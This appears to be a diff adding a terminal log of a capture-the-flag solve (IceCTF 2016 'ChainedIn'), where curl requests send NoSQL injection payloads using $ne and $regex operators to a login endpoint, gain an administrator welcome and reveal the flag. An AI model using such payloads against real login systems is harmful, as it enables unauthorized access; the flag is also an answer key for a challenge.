@@ -1,0 +1,9 @@
+[christrc@kali ~/Dr/P/co/ch/CT/2016/I/s/Vape_Nation]$ curl -X POST "http://chainedin.vuln.icec.tf/login" -H "Content-Type: application/json" -d '{"user":{"$ne":""},"pass":"agent1568","1=1":1}'
+
+[christrc@kali ~/Dr/P/co/ch/CT/2016/I/We/ChainedIn]$ curl -X POST "http://chainedin.vuln.icec.tf/login" -H "Content-Type: application/json" -d '{"user":"admin","pass":{"$regex":".{12}"},"1=1":1}'
+{"message":"Welcome back Administrator!"}%                                                                                                       
+
+
+
+
+'IceCTF{I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanKs_monGo}'
